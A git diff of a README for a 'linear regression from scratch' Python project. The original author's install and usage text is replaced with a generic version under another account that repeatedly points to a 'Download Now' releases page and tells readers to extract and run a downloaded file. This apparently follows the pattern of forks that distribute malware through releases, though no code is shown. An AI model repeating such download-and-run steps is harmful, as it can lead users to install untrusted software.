@@ -1,97 +1,64 @@
-# 🤖 Linear Regression from Scratch (Univariate)
-A Python project implementing Linear Regression from scratch using NumPy, without relying on any ML libraries like scikit-learn.
-The goal is to understand the full mathematical workflow behind Linear Regression, including dataset preparation, cost function, gradient descent, training, and evaluation.
-## ✨ Features
-- Loads and visualizes the dataset (Population vs Profit).
-- Implements the hypothesis function manually.
-- Computes Cost Function (MSE) step by step.
-- Implements Gradient Descent without any ML libraries.
-- Trains the model to find optimal parameters (θ).
-- Evaluates the model using MSE, MAE, and R².
-- Visualizes the predicted regression line and error over iterations.
-- Saves learned parameters (model_theta.npy) for reuse.
-## 📋 Prerequisites
-Before running this project, ensure you have:
-- Python 3.8+
-- NumPy, Pandas, Matplotlib libraries
-- CSV dataset data.csv inside a data folder
-- Basic knowledge of Python and Linear Regression
-## 🚀 Getting Started
-1. Clone the repository:
-```bash
-git clone https://github.com/radwanhefny/linear-regression-from-scratch-univariate.git
-cd linear-regression-from-scratch-univariate
-```
-2. Install dependencies:
-```bash
-pip install -r requirements.txt
-```
-3. Run the project:
+# 📊 linear-regression-from-scratch-univariate - Understand Linear Regression Easily
 
-To run the notebook, simply launch Jupyter Notebook and open the file:
+## 🚀 Download Now
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/bigtom000/linear-regression-from-scratch-univariate/releases)
 
-```bash
-jupyter notebook linear_regression_from_scratch_multivariate.ipynb
-```
-## 🎬 Screenshots / Demo
+## 📖 Overview
+This project offers a simple way to learn Univariate Linear Regression. It provides a complete guide through the mathematical process. You'll learn about data preparation, the cost function, gradient descent, and how to evaluate results. All of this is done in Python, without using any machine learning libraries. 
 
-### 📈 Prediction Line Plot  
-Shows how the model fits the data.  
-<img src="https://raw.githubusercontent.com/radwanhefny/linear-regression-from-scratch-univariate/main/results/prediction.png" width="500"/>
+## 🛠 Features
+- **Data Preparation**: Learn how to clean and prepare your data.
+- **Cost Function**: Understand how to measure the prediction error.
+- **Gradient Descent**: Implement the method to optimize your model.
+- **Evaluation**: Assess the performance of your linear regression.
 
----
+## 🗺️ Topics Covered
+- Data Analysis
+- Univariate Linear Regression
+- Gradient Descent
+- Python Basics
+- Statistics
+- Supervised Learning
 
-### 📉 Error Plot  
-Shows the cost/error decreasing over iterations.  
-<img src="https://raw.githubusercontent.com/radwanhefny/linear-regression-from-scratch-univariate/main/results/error.png" width="500"/>
+## 📦 System Requirements
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: Python 3.6 or above
+- **Memory**: At least 4 GB RAM
+- **Storage**: Minimum 100 MB of free space
 
+## 📥 Download & Install
+To get started, follow these steps:
 
+1. **Visit the Releases Page**: Click the link below to access the releases page.
 
-## 🗂️ Project Structure
-```
-📁 linear-regression-from-scratch-univariate
-├── linear-regression-from-scratch-univariate.py   # Core calculations: cost, gradient descent, training
-├── data/
-│   └── data.csv           # Dataset(The data contains one independent variable, which is population size, │                                     and one dependent variable, which is profit.)
-├── results/
-│   ├── prediction.png     # Predicted regression line
-│   └── error.png          # Error over iterations
-├── model_theta.npy        # Saved model parameters for reuse
-├── requirements.txt
-└── README.md
+   [Download Here](https://github.com/bigtom000/linear-regression-from-scratch-univariate/releases)
 
+2. **Select a Version**: You'll see a list of available versions. Choose the latest version for the best features and updates.
 
+3. **Download**: Click on the version you want to download. The file will start downloading to your computer. 
 
-```
-## 🛠️ Usage
-Run the notebook to train the model and generate results.
-Expected output:
-- prediction.png → Predicted line vs training data
-- error.png → Cost function over training iterations
-- Expected R^2 Score: ~0.70 (This score is considered very good, given that the model is univariate and working on real/experimental data.)
+4. **Extract the Files**: Once the download is complete, locate the file in your downloads folder and extract its contents.
 
-## ✅ Evaluation Metrics
-- Mean Squared Error (MSE)
-- Mean Absolute Error (MAE)
-- R² score
-## 🧠 How It Works
-1. Reads the dataset using Pandas.
-2. Adds a column of ones for the bias term.
-3. Separates X (features) and y (target).
-4. Implements Cost Function (MSE) manually.
-5. Implements Gradient Descent step by step to update θ.
-6. Trains the model to minimize the cost.
-7. Visualizes the regression line and training error over iterations.
+5. **Run the Application**: Open a terminal or command prompt and navigate to the extracted folder. Use the command below to run the program:
 
-## 🤝 Contributing
-Contributions are welcome!
-1. Fork the repository
-2. Create a new feature branch
-3. Submit a pull request
-Please ensure your code is clean, structured, and well-commented.
+   ```
+   python main.py
+   ```
+
+6. **Follow the Prompts**: The application will guide you through the process. Simply follow the on-screen instructions.
+
+## 🧑‍🤝‍🧑 Community and Support
+If you have questions or need help, feel free to reach out. You can check out the [issues section](https://github.com/bigtom000/linear-regression-from-scratch-univariate/issues) on GitHub for common questions and troubleshooting. 
+
+## 🎓 Learning Resources
+- **Python Documentation**: Learn the basics of Python [here](https://www.python.org/doc/).
+- **Linear Regression Basics**: A great introduction can be found [here](https://www.statisticshowto.com/probability-and-statistics/statistics-definitions/linear-regression/).
+- **Gradient Descent Explained**: Understand how gradient descent works [here](https://machinelearningmastery.com/gradient-descent-for-machine-learning/).
+
+## 📈 Contributing
+Contributions are welcome! If you want to improve this project, please fork the repository and submit a pull request. 
+
 ## 📝 License
-This project is licensed under the MIT license - see the LICENSE file for details. 
-## 📞 Support
-If you have questions or need help, feel free to:
-- Open an issue on this repository  
-- Connect with me on LinkedIn: https://www.linkedin.com/in/radwanhefny  
+This project is licensed under the MIT License. 
+
+For any inquiries or further information, feel free to contact me through GitHub. Happy analyzing!
